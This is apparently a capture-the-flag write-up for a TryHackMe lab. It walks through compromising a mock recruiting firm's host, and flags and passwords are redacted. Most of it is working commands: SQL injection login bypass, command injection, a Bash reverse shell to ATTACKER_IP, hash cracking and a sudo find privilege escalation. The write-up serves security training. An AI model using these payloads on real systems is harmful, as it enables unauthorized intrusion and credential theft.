# Operation Promotion

Room: https://tryhackme.com/room/operationpromotion

One engagement stands between you and your next title.

you are up for promotion at Hadron Security. Your senior lead, Mara, has handed you a solo engagement against RecruitCorp, a small recruiting firm with a public-facing portal. Compromise the host, capture the flags, and demonstrate that you are ready for the Penetration Tester title.

Start the by clicking the Start Machine button at the top-right of the task. You can complete the challenge by connecting through or the AttackBox, which contains all the essential tools.

Allow two to three minutes for all services to start.

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/jr-penetration-tester/operationpromotion.md

## Overview

RecruitCorp exposed a small web application and a Samba share. The final path was:

1. Enumerate open services.
2. Find a public Samba share.
3. Discover `/admin/` from `robots.txt`.
4. Bypass the admin login with SQL injection.
5. Use the admin user lookup to discover a maintenance endpoint.
6. Exploit command injection in the ping check.
7. Read the application database configuration.
8. Use CeWL against the main website to build a targeted wordlist.
9. Crack the `jford` bcrypt hash.
10. SSH as `jford`.
11. Abuse `sudo` permissions on `find` to become root.

Flags and final passwords are redacted in this writeup.

---

## Enumeration

Initial scan showed SSH, HTTP, and Samba services.

```bash
nmap -sC -sV -p- 10.66.130.252
```

Interesting ports:

```text
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu
80/tcp  open  http        Apache httpd 2.4.58
139/tcp open  netbios-ssn Samba smbd
445/tcp open  netbios-ssn Samba smbd
```

---

## Samba Enumeration

The Samba service allowed anonymous share listing.

```bash
smbclient -L //10.66.130.252 -N
```

Output showed a `public` share:

```text
Sharename       Type      Comment
---------       ----      -------
public          Disk
IPC$            IPC       IPC Service (RecruitCorp File Services)
```

Connecting to the share showed only a README file.

```bash
smbclient //10.66.130.252/public -N
```

Inside `smbclient`:

```text
smb: \> ls
  .                                   D        0
  ..                                  D        0
  README.txt                          N       92

smb: \> get README.txt
```

The README contained:

```text
This share is reserved for future internal file distribution.
Nothing to see here yet.
- IT
```

The share was useful as an early clue, but it did not become the main exploitation path.

---

## Hostname Setup

The site used the RecruitCorp theme, so the hostname was added locally.

```bash
echo "10.66.130.252 recruitcorp.thm" | sudo tee -a /etc/hosts
```

---

## Web Enumeration

The `robots.txt` file exposed an admin path.

```bash
curl -s http://recruitcorp.thm/robots.txt
```

Output:

```text
User-agent: *
Disallow: /admin/
```

Opening `/admin/` showed a login page.

```bash
curl -i http://recruitcorp.thm/admin/
```

The login form posted back to `/admin/` with `username` and `password` fields.

---

## SQL Injection Login Bypass

The admin login was vulnerable to SQL injection. The following username bypassed authentication:

```text
' or 1=1 --
```

A cookie was saved after login:

```bash
curl -s -c cookies.txt -X POST http://recruitcorp.thm/admin/ \
  -d "username=' or 1=1 --&password=test"
```

Then the authenticated admin page could be requested with:

```bash
curl -s -b cookies.txt http://recruitcorp.thm/admin/
```

---

## User Lookup Enumeration

The admin area exposed a user lookup endpoint:

```text
/admin/users/lookup.php?id=1
```

A loop was used to enumerate user IDs.

```bash
for i in $(seq -20 50); do
  echo "===== ID $i ====="
  curl -s "http://recruitcorp.thm/admin/users/lookup.php?id=$i" \
    -b cookies.txt \
    | sed -n '/<main/,/<\/main>/p' \
    | sed 's/<[^>]*>//g' \
    | sed '/^[[:space:]]*$/d'
done
```

Valid users were found from ID 1 to 9.

Important entry:

```text
ID7
Usernamesysmaint
Rolesystem
NotesService account for /admin/sysmaint-checks/ping.php. Do not disable.
```

This note revealed the next endpoint.

---

## Command Injection in Ping Check

The maintenance endpoint accepted a `host` parameter.

```bash
curl -i -s 'http://recruitcorp.thm/admin/sysmaint-checks/ping.php' -b cookies.txt
```

Output:

```text
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

Testing command injection with `id` confirmed code execution as `www-data`.

```bash
curl -s 'http://recruitcorp.thm/admin/sysmaint-checks/ping.php?host=127.0.0.1%3Bid' \
  -b cookies.txt
```

Output included:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Reverse Shell

A listener was started on the attack machine.

```bash
nc -lvnp 4444
```

The command injection was used to trigger a Bash reverse shell.

```bash
curl -s 'http://recruitcorp.thm/admin/sysmaint-checks/ping.php?host=127.0.0.1%3Bbash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261%22' \
  -b cookies.txt
```

Shell received:

```text
www-data@recruitcorp:/var/www/html/admin/sysmaint-checks$ whoami
www-data
```

---

## Application Database Configuration

Inside the web directory, an application database config file was found.

```bash
cat /var/www/html/config/db.conf
```

Contents:

```text
# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$REDACTED
db_engine=sqlite3
```

This revealed the local user `jford` and a bcrypt password hash.

The local users confirmed `jford` existed:

```bash
cat /etc/passwd | grep bash
```

Output included:

```text
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
jford:x:1001:1001::/home/jford:/bin/bash
```

---

## SQLite Database Dump

The PHP source showed the SQLite database path.

```bash
grep -RniE "sqlite|SQLite3|PDO|db_name|db.conf|recruitcorp" /var/www/html 2>/dev/null
```

Useful result:

```text
/var/www/html/admin/users/lookup.php:9:$db = new SQLite3('/var/lib/recruitcorp/app.db');
/var/www/html/admin/index.php:15:    $db = new SQLite3('/var/lib/recruitcorp/app.db');
```

The database contained a single `users` table.

```bash
sqlite3 /var/lib/recruitcorp/app.db '.tables'
```

Output:

```text
users
```

Schema:

```bash
sqlite3 /var/lib/recruitcorp/app.db '.schema'
```

Output:

```text
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    role TEXT NOT NULL,
    notes TEXT
);
```

The table was dumped:

```bash
sqlite3 /var/lib/recruitcorp/app.db '.headers on' '.mode column' 'SELECT id,username,password,role,notes FROM users;'
```

This revealed plaintext web application passwords, but they did not work for SSH as `jford` or `ubuntu`.

---

## Building a Targeted Wordlist with CeWL

The main website contained useful password theme words, including:

```text
Connecting talent with opportunity since 2019
Spring 2026 Hiring Drive
RecruitCorp is opening a new office in Singapore
summer cohort
AI and machine learning roles
```

A CeWL wordlist was generated from the main website.

```bash
cewl -d 2 -m 4 --with-numbers http://recruitcorp.thm/ -w cewl_words.txt
```

Because the web root was writable by `www-data`, the site source was also archived and downloaded for local analysis.

On the target:

```bash
cd /var/www
tar -czf /var/www/html/recruitcorp_www.tar.gz html
```

On the attack machine:

```bash
wget http://recruitcorp.thm/recruitcorp_www.tar.gz
mkdir recruitcorp_www
tar -xzf recruitcorp_www.tar.gz -C recruitcorp_www
```

The source words were extracted recursively.

```bash
cd recruitcorp_www/html
grep -RohE '[A-Za-z0-9_@.-]{4,}' . | sort -u > source_words.txt
```

The source list was small enough for bcrypt targeting.

```bash
wc source_words.txt
```

Example size:

```text
356 356 2968 source_words.txt
```

The CeWL list and source words were combined and mutated with likely years and symbols.

```bash
cat cewl_words.txt source_words.txt 2>/dev/null | sort -u > base_words.txt

while read -r w; do
  echo "$w"
  echo "${w}2019"
  echo "${w}2025"
  echo "${w}2026"
  echo "${w}!"
  echo "${w}123"
  echo "${w}2019!"
  echo "${w}2026!"
  echo "${w}_2019"
  echo "${w}_2026"
  echo "${w}@2019"
  echo "${w}@2026"
done < base_words.txt | sort -u > recruit_candidates.txt
```

The candidate list was still very manageable for bcrypt.

```bash
wc recruit_candidates.txt
```

Example:

```text
4272 4272 51992 recruit_candidates.txt
```

---

## Cracking the bcrypt Hash

The hash from `db.conf` was saved locally.

```bash
echo '$2b$10$REDACTED' > hash.txt
```

Hashcat mode `3200` was used for bcrypt.

```bash
hashcat -m 3200 hash.txt recruit_candidates.txt
```

The hash cracked successfully.

```text
$2b$10$REDACTED:REDACTED_PASSWORD
```

The cracked password was then used for SSH access as `jford`.

```bash
ssh jford@10.66.130.252
```

---

## User Flag

After logging in as `jford`, the user flag was in the home directory.

```bash
ls
cat user.txt
```

Output:

```text
THM{REDACTED_USER_FLAG}
```

---

## Privilege Escalation

The next step was to check sudo privileges.

```bash
sudo -l
```

Output:

```text
User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
```

`find` can execute commands with `-exec`. Since it could be run as root through sudo, it was used to spawn a privileged Bash shell.

```bash
sudo /usr/bin/find . -exec /bin/bash -p \; -quit
```

This gave a root shell.

```bash
whoami
id
```

Output:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

---

## Root Flag

The root flag was found in `/root`.

```bash
cd /root
ls
cat flag.txt
```

Output:

```text
THM{REDACTED_ROOT_FLAG}
```

---

## Key Takeaways

- Samba was useful for early service context, but not needed for exploitation.
- `robots.txt` exposed the admin panel.
- The admin login was vulnerable to SQL injection.
- The admin lookup leaked the maintenance ping endpoint.
- The ping endpoint had command injection.
- The application config exposed a bcrypt hash tied to `jford`.
- CeWL was effective because the main website contained the password theme.
- `sudo` access to `find` gave a straightforward root shell through `-exec`.
